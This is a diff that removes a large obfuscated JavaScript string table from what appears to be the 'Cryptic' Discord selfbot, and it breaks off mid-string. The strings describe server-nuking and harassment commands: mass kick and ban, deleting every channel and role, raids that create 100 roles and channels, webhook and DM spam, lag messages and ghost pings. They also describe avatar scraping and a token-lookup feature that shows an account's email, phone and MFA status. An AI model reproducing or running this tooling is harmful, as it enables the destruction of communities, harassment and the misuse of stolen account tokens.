@@ -1,189 +1,2346 @@
-const _0x31bf=['\x0a\x20\x20\x20\x20Offline:\x20','createChannel','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20██████╗██████╗\x20██╗\x20\x20\x20██╗██████╗\x20████████╗██╗\x20██████╗\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20██╔════╝██╔══██╗╚██╗\x20██╔╝██╔══██╗╚══██╔══╝██║██╔════╝\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20██║\x20\x20\x20\x20\x20██████╔╝\x20╚████╔╝\x20██████╔╝\x20\x20\x20██║\x20\x20\x20██║██║\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20██║\x20\x20\x20\x20\x20██╔══██╗\x20\x20╚██╔╝\x20\x20██╔═══╝\x20\x20\x20\x20██║\x20\x20\x20██║██║\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20╚██████╗██║\x20\x20██║\x20\x20\x20██║\x20\x20\x20██║\x20\x20\x20\x20\x20\x20\x20\x20██║\x20\x20\x20██║╚██████╗\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20╚═════╝╚═╝\x20\x20╚═╝\x20\x20\x20╚═╝\x20\x20\x20╚═╝\x20\x20\x20\x20\x20\x20\x20\x20╚═╝\x20\x20\x20╚═╝\x20╚═════╝\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','nameAcronym','default','spam\x20<amount>\x20<message>\x20»\x20Spams\x20your\x20message\x20the\x20specified\x20amount\x20of\x20times\x0a','hasPermission','subtract','MEDIUM','cembed\x20<options>**\x20»\x20Talk\x20to\x20yourself\x20as\x20if\x20it\x27s\x20a\x20chat\x20bot\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','stack','5.3.1','cyan','Please\x20specify\x20a\x20message','massreact','US\x20South','You\x27ve\x20just\x20been\x20raided','us-central','\x0a\x20\x20\x20\x20\x20\x20\x20\x20Humans:\x20','limit','nitrogen','`ERROR`\x0a```js\x0a','hastebin','nitro**\x20»\x20Generates\x20a\x20random\x20discord\x20nitro\x20code\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','Low',':grey_exclamation:','lower','botinfo**\x20»\x20Shows\x20information\x20on\x20the\x20Cryptic\x20selfbot\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','https://some-random-api.ml/animu/wink','meme','US\x20East','Discriminator','Signs\x20point\x20to\x20yes.','common-tags','toArray','Total\x20Boosts','https://some-random-api.ml/base64?encode=','Please\x20specify\x20some\x20text\x20to\x20speak\x20in\x201337','**Found\x20Password**\x20»\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','watching\x20<message>**\x20»\x20Sets\x20your\x20activity\x20as\x20watching\x20with\x20your\x20message\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','https://some-random-api.ml/facts/cat','yaml','emojify\x20<text>**\x20»\x20Converts\x20your\x20text\x20to\x20emojis\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','90.135.87.199','Discord.js\x20Version','Successfully\x20made\x20the\x20','**Found\x20Email**\x20»\x20','https://some-random-api.ml/facts/dog','Can\x20you\x20send\x20me\x20your\x20token?','watching','Sydney','account**\x20»\x20Account\x20Commands\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','GIVEAWAY','Please\x20specify\x20an\x20emoji','listening\x20<message>**\x20»\x20Sets\x20your\x20activity\x20as\x20listening\x20with\x20your\x20message\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','Account\x20Created','masskick**\x20»\x20Kicks\x20everyone\x20in\x20the\x20server\x20(Not\x20including\x20the\x20server\x20owner\x20or\x20members\x20with\x20a\x20higher\x20rank/role)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','highestRole','uncaughtExceptionMonitor','exec','Ask\x20again\x20later.','createrole','users','setName','**Found\x20Token**\x20»\x20','moderation','Please\x20provide\x20some\x20text','setIcon','from','It\x20is\x20decidedly\x20so.','serverinfo**\x20»\x20Shows\x20the\x20servers\x20information\x20[GUILD\x20ONLY]\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','serverinfo','Free\x20Discord\x20Nitro','setUsername','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','```Guild\x20Name:\x20','ban','\x0a\x20\x20\x20\x20Humans:\x20','Cannot\x20predict\x20now.','\x20hour,\x20','reply','startsWith','codeblock','Question:','react','binary\x20<encode|decode>\x20<message|binary>**\x20»\x20Encodes/decodes\x20binary\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','then','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Date**\x20»\x20','split','addRole','Please\x20specify\x20a\x20redirect\x20url','owner','hidden','credit','Please\x20mention\x20a\x20user','Please\x20specify\x20a\x20role\x20name\x20to\x20delete','raid\x20»\x20Changes\x20the\x20server\x20name,\x20icon,\x20creates\x20100\x20roles\x20and\x20makes\x20100\x20text\x20and\x20voice\x20channels\x0a','unshift','\x20seconds\x20','charCodeAt','output.txt','clear','deleterole','Response:','**\x20role','messages','hongkong','text**\x20»\x20Text\x20Commands\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','webhookraid','Your\x20activity\x20was\x20successfully\x20set\x20to\x20`PLAYING`\x20with\x20message\x20`','Guild\x20Name','hasPermissions','\x0a\x20\x20\x20\x20\x20\x20\x20\x20Streaming:\x20','251.224.76.96','@everyone','deletable','setFooter','Here\x20is\x20some\x20information\x20on\x20','Brazi`','L\x20LTS','\x20role\x20rainbow','MMMM\x20Do\x20YYYY,\x20h:mm\x20A','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Phone\x20Number**\x20»\x20','ruby','Giveaway\x20Sniper?','ghostping\x20<channel-id>\x20<user-id>**\x20»\x20Ghostpings\x20the\x20user\x20in\x20the\x20channel\x20[GUILD\x20ONLY]\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','first','sydney','Without\x20a\x20doubt.','masskick\x20»\x20Kicks\x20everyone\x20in\x20the\x20server\x20(Not\x20including\x20the\x20server\x20owner\x20or\x20members\x20with\x20a\x20higher\x20rank/role)\x0a','ascii','empty','writeFileSync','axios','Developer:','Hong\x20Kon`','us-east','Your\x20mum\x20is\x20so\x20ugly,\x20that\x20she\x20made\x20my\x20happy\x20meal\x20cry\x20:sunglasses:','dmall\x20»\x20Sends\x20mostly\x20everyone\x20in\x20the\x20server\x20a\x20message\x20of\x20your\x20choice\x0a','Members','masskick','get','@extreme_hero/deeptype','\x0a\x20\x20\x20\x20Text:\x20','Uptime','Invalid\x20webhook\x20url','stealallpfp','tag','https://github.com/p9sq/Cryptic','\x0aMember\x20Presence:\x0a\x20\x20\x20\x20Do\x20Not\x20Disturb:\x20','member','@everyone\x20|\x20','India','Congratulations\x20<@','map','nitrogen\x20<amount>**\x20»\x20Generates\x20the\x20amount\x20of\x20discord\x20nitro\x20codes\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','link','Guild\x20name\x20is\x20to\x20long','\x20˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞','294882584201003009','\x20|\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20Online:\x20','Mention\x20must\x20be\x20true\x20or\x20false','strikethrough','>,\x20Go\x20and\x20search\x20for\x20a\x20file\x20called\x20`avatars.json`\x20on\x20your\x20desktop','lua','clean','pat','<@!','copy\x20<user>**\x20»\x20Sets\x20your\x20username\x20and\x20avatar\x20as\x20the\x20mentioned\x20users\x20avatar\x0a\x20\x20\x20\x20\x20\x20\x20\x20**','The\x20list\x20was\x20to\x20big,\x20click\x20this\x20link\x20to\x20view\x20all\x20commands:\x0a**https://hastebin.com/','Password','Boost\x20Level','status**\x20»\x20Status\x20Commands\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','Voice\x20Channels','hug','Successfully\x20removed\x20the\x20**','Yes.','fact','log','https://some-random-api.ml/animu/pat','superagent','Text\x20Commands','shrug**\x20»\x20Sends\x20¯\x5c_(ツ)_/¯\x20into\x20the\x20current\x20channel\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','face','Can\x20I\x20have\x20your\x20bots\x20source\x20code?','ascii\x20<text>**\x20»\x20Converts\x20your\x20message\x20to\x20ascii\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','image','public_flags','us-south','RANDOM','**\x20role\x20from\x20**','date','ms\x0a```','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','cat','streaming','┬─┬\x20ノ(\x20゜-゜ノ)','format','json','||***__~~','cat**\x20»\x20Random\x20cat\x20image\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','[+]\x20Message\x20sent\x20to\x20','original','Please\x20specify\x20a\x20token','[-]\x20Couldn\x27t\x20send\x20message\x20to\x20','delchannels**\x20»\x20Deletes\x20every-single\x20channel\x20in\x20the\x20server\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','voice','\x20info','Your\x20activity\x20was\x20successfully\x20set\x20to\x20`STREAMING`\x20with\x20message\x20`','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Message**\x20»\x20','My\x20reply\x20is\x20no.','india','Guild\x20created\x20at','fakenitro',':one:','parseInt','Please\x20specify\x20a\x20message\x20to\x20emojify','Webhook','\x20-\x20Unknown\x20nitro\x20code\x20was\x20either\x20redeemed\x20or\x20invalid/fake]','catch','\x20more!','I\x20like\x20ya\x20cut\x20g','fromNow','discriminator','Please\x20provide\x20a\x20message','**Most\x20common\x20sentence**\x20»\x20','Content-Type','That\x20role\x20does\x20not\x20exist',':nine:','Fun\x20Commands','Bot\x20Version','html','destroy','message',':three:','Please\x20specify\x20a\x20user\x20id','toLocaleString','https://i.gyazo.com/80906ef5fe2f571b352ed3cbe53734ef.png','GET','\x0a\x20\x20\x20\x20\x20\x20\x20\x20Voice:\x20','false','catfact**\x20»\x20Random\x20cat\x20fact\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','string','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Email**\x20»\x20','Please\x20provide\x20text\x20shorter\x20that\x202000\x20characters.','You\x20may\x20rely\x20on\x20it.','java','unflip**\x20»\x20Sends\x20┬─┬\x20ノ(\x20゜-゜ノ)\x20into\x20the\x20current\x20channel\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','\x0a```','\x0aBoost\x20Level:\x20',':four:','nitrogen\x20<amount>\x20»\x20Generates\x20the\x20amount\x20of\x20discord\x20nitro\x20codes\x0a','Guild\x20Region','Logging\x20in,\x20please\x20wait...','\x20\x20hugs\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20Offline:\x20','russia','removerole\x20<role>\x20<member>**\x20»\x20Removes\x20the\x20mentioned\x20role\x20from\x20the\x20mentioned\x20member\x0a\x20\x20\x20\x20\x20\x20\x20\x20**','```','whois\x20[user]**\x20»\x20Shows\x20information\x20on\x20the\x20mentioned\x20user\x20[GUILD\x20ONLY]\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','**Complete!**','Cryptic\x20is\x20a\x20discord\x20user\x20automation\x20tool','red','fromCharCode','(\x20͡°\x20͜ʖ\x20͡°)',':regional_indicator_','\x0aMembers:\x0a\x20\x20\x20\x20Total:\x20','Please\x20specify\x20a\x20role\x20color','Text\x20Channels','setAuthor','That\x20user\x20does\x20not\x20exist\x20in\x20this\x20server','animals','HIGH','POST','stringify','avatar','singapore','masschannels\x20»\x20Creates\x20a\x20whole\x20bunch\x20of\x20random\x20channels\x0a','\x0aTotal\x20Emojis:\x20','Please\x20provide\x20a\x20question\x20to\x20ask\x20the\x208ball.','\x20-\x20Giveaway\x20Sniped]','Concentrate\x20and\x20ask\x20again.','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**MFA?**\x20»\x20','flip**\x20»\x20Sends\x20(╯°□°）╯︵\x20┻━┻\x20into\x20the\x20current\x20channel\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','deleterole\x20<name>**\x20»\x20Delets\x20the\x20role\x20from\x20the\x20server\x0a\x20\x20\x20\x20\x20\x20\x20\x20**','YoMamaIsGay','Please\x20specify\x20the\x20amount\x20of\x20messages\x20to\x20spam!','Your\x20activity\x20was\x20successfully\x20set\x20to\x20`LISTENING`\x20with\x20message\x20`','**Fetching\x20DMs...**',':seven:','fun**\x20»\x20Fun\x20Commands\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','createdTimestamp','Available\x20Commands','startOf','-\x20ELAPSED:\x20','```\x0aAbusive\x20Commands\x20[GUILD\x20ONLY]\x0a\x0a<>\x20=\x20required\x20|\x20[]\x20=\x20optional\x0a\x20\x20\x20\x20\x20\x20\x0a','moderation**\x20»\x20Moderation\x20Commands\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','Uh\x20Oh,\x20an\x20error\x20has\x20occurred.\x20Error\x20','attachment','giveaway_sniper','That\x20is\x20not\x20a\x20valid\x20id.','Troll\x20Commands','ready','abusive**\x20»\x20Nuke\x20Commands\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','hack','stealpfp',':five:','delchannels\x20»\x20Deletes\x20every-single\x20channel\x20in\x20the\x20server\x0a','https://discord.gift/','Webhook\x20URL\x20not\x20specified\x20in\x20config.json','**Reported\x20to\x20discord\x20for\x20selfbotting...**','Node.js\x20Version',':heavy_dollar_sign:','edit','It\x20is\x20certain.','proxyURL','slice','playing\x20<message>**\x20»\x20Sets\x20your\x20activity\x20as\x20playing\x20with\x20your\x20message\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','Pinging...','-\x20AUTHOR:\x20','Success','offline','\x20Info','\x0aChannels:\x0a\x20\x20\x20\x20Total\x20','setDescription','moment','underline','[+]\x20Message\x20sent\x20to\x20#','KICK_MEMBERS','Invalid\x20token','timeStyle','Member\x20Presence','original**\x20»\x20Resets\x20the\x20entire\x20server\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','Please\x20mention\x20a\x20user\x20to\x20kick','Logged\x20in\x20as','stealallpfp**\x20»\x20Gets\x20everyones\x20avatar\x20and\x20saves\x20it\x20into\x20a\x20json\x20file\x20on\x20your\x20desktop\x20[GUILD\x20ONLY]\x0a\x20\x20\x20\x20\x20\x20\x20\x20**','VERY_HIGH','||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||||||<@!','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**NSFW?**\x20»\x20','read**\x20»\x20Marks\x20every\x20server\x20that\x20you\x20are\x20in\x20as\x20read\x0a\x20\x20\x20\x20\x20\x20\x20\x20**','40.2.54.239','troll**\x20»\x20Troll\x20Commands\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','spam\x20<amount>\x20<message>**\x20»\x20Spams\x20your\x20message\x20the\x20specified\x20amount\x20of\x20times\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','raided-by-cryptic','token','Yes\x20–\x20definitely.','brazil','\x0a\x20\x20\x20\x20\x20\x20\x20\x20','discord.gift','permissions','raid','forEach',']\x20Total\x20Roles','version','attachments','webhookURL',':zero:','kick\x20<member>\x20[reason]**\x20»\x20Kicks\x20the\x20mentioned\x20member\x20from\x20the\x20server\x0a\x20\x20\x20\x20\x20\x20\x20\x20','tokeninfo','catfact','delroles\x20»\x20Deletes\x20every-single\x20role\x20in\x20the\x20server\x0a','dataStyle','\x20pats\x20','https://media3.giphy.com/media/TzyV32fsqLpbA0PHJf/giphy.gif','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Username**\x20»\x20','dmall','BAN_MEMBERS','addrole\x20<role>\x20<member>**\x20»\x20Gives\x20the\x20mentioned\x20role\x20to\x20the\x20mentioned\x20member\x0a\x20\x20\x20\x20\x20\x20\x20\x20**','@hotmail.com','**Time\x20Taken:**\x20```\x0a','delroles**\x20»\x20Deletes\x20every-single\x20role\x20in\x20the\x20server\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','raided\x20by\x20Cryptic','Better\x20not\x20tell\x20you\x20now.','Russia','Status\x20Commands','setActivity','lag\x20<user-id>\x20<amount>\x20»\x20Sends\x20the\x20user\x20the\x20specified\x20amount\x20of\x20lag\x20messages\x0a','reason','https://www.twitch.tv/cryptic','Random\x20dog\x20image','massroles','account','info**\x20»\x20Info\x20Commands\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','caption','unflip','setText','europe','utility**\x20»\x20Utility\x20Commands\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','addrole','embedOptions','\x20hours,\x20','nitro_sniper','size','token-here','Done!','Please\x20mention\x20a\x20member','invisible**\x20»\x20Sets\x20your\x20username\x20and\x20avatar\x20as\x20something\x20invisible\x0a\x20\x20\x20\x20\x20\x20\x20\x20**','\x0aGuild\x20created\x20at:\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20Text:\x20','locale','guilds','animals**\x20»\x20Animals\x20Commands\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','color','**\x20role\x20to\x20**','italics','foxfact**\x20»\x20Random\x20fox\x20fact\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','flags','...\x20and\x20','emojify','Authorization','[ERROR]:','createRole','channel','https://some-random-api.ml/bottoken','setImage','fox','Uknown\x20parameter.\x20Please\x20choose\x20the\x20method\x20first,\x20either\x20decode\x20or\x20encode\x20it','setTitle',']\x20Logged\x20in\x20as\x20','**\x20was\x20successfully\x20kicked\x20from\x20this\x20server','Random\x20cat\x20image','\x0a\x20\x20\x20\x20','dog','\x20week,\x20','empty**\x20»\x20Sends\x20an\x20empty\x20message\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','dnd','repeat','base64\x20<encode|decode>\x20<message|base64>**\x20»\x20Encodes/decodes\x20base64\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','-\x20SERVER:\x20','idle','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','type','spamall\x20<message>**\x20»\x20Sends\x20every\x20channel\x20a\x20message\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','tokeninfo\x20<token>**\x20»\x20Gets\x20information\x20on\x20that\x20token\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','\x20minutes,\x20and\x20','replace','region','test','**Type:**\x20```ts\x0a','RAIDED\x20BY\x20CRYPTIC','Please\x20provide\x20some\x20text.','acknowledge','/redeem','channels','\x0aVerification\x20Level:\x20','css','utc','send','#1B78E7','lag\x20<user-id>\x20<amount>**\x20»\x20Sends\x20the\x20user\x20the\x20specified\x20amount\x20of\x20lag\x20messages\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','everything','base64','Disabled','-\x20CHANNEL:\x20','floor','https://some-random-api.ml/base64?decode=','find','**The\x20*totally*\x20real\x20hack\x20has\x20been\x20successfully\x20completed!**','hastebin\x20<message>**\x20»\x20Sends\x20your\x20message\x20to\x20a\x20hastebin\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','dogfact','p9sq69#0594','Please\x20provide\x20some\x20text!','Account\x20Commands','Please\x20specify\x20the\x20amount\x20of\x20messages\x20to\x20spam.','./config.json','true','mentions','stopTyping','https://i.gyazo.com/e720243a3d6cd9425e8b97456263debd.png','Attachment','snipes','Redeem\x20Here:','**Injecting\x20virus\x20into\x20discriminator**\x20»\x20','PLAYING','\x0aGuild\x20ID:\x20','invisible','@gmail.com','Please\x20provide\x20a\x20message.','Random\x20fox\x20image','presence','toUpperCase','bold','webhookspam\x20<webhook-url>\x20<true|false>\x20<message>\x20»\x20Spams\x20the\x20webhook\x20100\x20times\x20with\x20your\x20message\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20(true\x20=\x20mention\x20everyone\x20with\x20your\x20message,\x20false\x20=\x20regular\x20message\x20without\x20mention)\x0a','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Discriminator**\x20»\x20','msg','listening','method','massban\x20»\x20Bans\x20everyone\x20in\x20the\x20server\x20(Not\x20including\x20the\x20server\x20owner\x20or\x20members\x20with\x20a\x20higher\x20rank/role)\x0a','[-]\x20Message\x20couldn\x27t\x20send\x20to\x20#','status','Please\x20mention\x20a\x20user.','nitro','./package.json','user','rainbow\x20<role>**\x20»\x20Edits\x20that\x20role\x20to\x20rainbow\x20colors\x0a\x20\x20\x20\x20\x20\x20\x20\x20**','Error!\x20I\x20do\x20not\x20have\x20enough\x20permissions\x20to\x20do\x20that',']\x20Loading...','\x20winks\x20at\x20','massroles\x20»\x20Creates\x20a\x20whole\x20bunch\x20of\x20random\x20roles\x0a','<https://google.com>\x20​||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||||||@everyone',':six:','messageLogs','https://some-random-api.ml/img/dog','content','info','copy','https://discord.com/api/webhooks/','blue','dmall**\x20»\x20Sends\x20mostly\x20everyone\x20in\x20the\x20server\x20a\x20message\x20of\x20your\x20choice\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','foxfact','createdAt','My\x20sources\x20say\x20no.','-\x20CODE:\x20','cembed','Successfully\x20added\x20the\x20**','\x20has\x20been\x20Raided\x20:slight_smile:','email','abuse','US\x20West','RichEmbed','colors','verificationLevel','iconURL','spam','south\x20africa','flip','\x20weeks,\x20','removerole','Info\x20Commands','Please\x20provide\x20one\x20of\x20these\x20methods:\x20','\x20-\x20Valid\x20nitro\x20code\x20was\x20successfully\x20redeemed]','\x0a\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','Please\x20specify\x20a\x20role\x20name','High','LOW','node-superfetch','\x0a\x20\x20\x20\x20\x20\x20\x20\x20Total:\x20','addField','application/json','uptime','NONE','webhookraid\x20<amount>\x20<message>\x20»\x20Spams\x20@everyone\x20the\x20amount\x20of\x20times\x20with\x20your\x20message\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20(Must\x20have\x20webhook\x20url\x20in\x20the\x20config\x20file)','fun','troll','(╯°□°）╯︵\x20┻━┻','\x0a\x20\x20\x20\x20Voice:\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Locale**\x20»\x20','𝘾𝙧𝙮𝙥𝙩𝙞𝙘','STREAMING','MANAGE_ROLES','Raided\x20By\x20Cryptic','webhook-discord','toLowerCase','dog**\x20»\x20Random\x20dog\x20image\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','Face\x20Commands','MessageBuilder','stream\x20<message>**\x20»\x20Sets\x20your\x20activity\x20as\x20streaming\x20with\x20your\x20message\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','Guild\x20Permissions','massroles**\x20»\x20Creates\x20a\x20whole\x20bunch\x20of\x20random\x20roles\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','ownerID','dogfact**\x20»\x20Random\x20dog\x20fact\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','password','embed','Client','Code\x20Block','MANAGE_CHANNELS','length','fetchMessages','https://some-random-api.ml/chatbot?message=','\x0aGuild\x20Name\x20Acronym:\x20','toString','say\x20<message>**\x20»\x20Says\x20what\x20ever\x20you\x20want\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','Yes','parent','everyone','say','.png?size=2048','spolier\x20<message>**\x20»\x20Converts\x20your\x20text\x20to\x20a\x20spoiler\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','ID:','https://canary.discordapp.com/api/v6/users/@me','kick','text','DiscordIsCool','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Flags**\x20»\x20','startTyping','Moderation\x20Commands\x20[GUILD\x20ONLY]','binary','Please\x20specify\x20the\x20amount\x20of\x20messages\x20to\x20send','console-title','https://discord.com/invite/FRGKTJsFJg','delchannels','array','1337\x20<text>**\x20»\x20Speak\x201337\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','random','response','Please\x20mention\x20a\x20user\x20to\x20ban','utility','padStart','emojis','There\x27s\x20nothing\x20to\x20snipe.','lenny**\x20»\x20Sends\x20(\x20͡°\x20͜ʖ\x20͡°)\x20into\x20the\x20current\x20channel\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','\x0aGuild\x20Owner:\x20','discord.js','dog.png','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Public\x20Flags**\x20»\x20','verified','Past\x20Names','lag','../../../Desktop/avatars.json','full','Reply\x20hazy,\x20try\x20again.',':heavy_minus_sign:','reset**\x20»\x20Resets\x20your\x20current\x20activity\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','pat.png','Total\x20Emojis','rainbow','\x20|\x20Since\x20','stream','\x0a\x20\x20\x20\x20\x20\x20\x20\x20Bots:\x20','Please\x20specify\x20a\x20valid\x20type.\x20Types:\x2